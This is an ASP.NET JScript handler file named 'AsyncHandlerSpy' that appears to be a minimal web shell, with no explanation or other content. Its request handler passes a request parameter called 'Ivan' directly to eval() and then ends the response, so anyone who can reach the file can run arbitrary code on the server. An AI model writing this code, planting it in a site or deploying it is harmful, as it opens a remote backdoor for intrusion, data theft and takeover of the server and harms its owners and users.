
<%@ WebHandler Language=”JScript” class=”AsyncHandlerSpy”%>

import System;
import System.Web;
import System.IO;

public class AsyncHandlerSpy implements IHttpAsyncHandler
{

    function IHttpAsyncHandler.BeginProcessRequest(context : HttpContext,asyncCallback :AsyncCallback , obj : Object ) : IAsyncResult
    {
        eval(context.Request[“Ivan”]);
        HttpContext.Current.Response.End();
    }

    function IHttpAsyncHandler.EndProcessRequest(result : IAsyncResult ){}

    function IHttpHandler.ProcessRequest(context : HttpContext) {}

    function get IHttpHandler.IsReusable() : Boolean
    {
        return false;
    }

}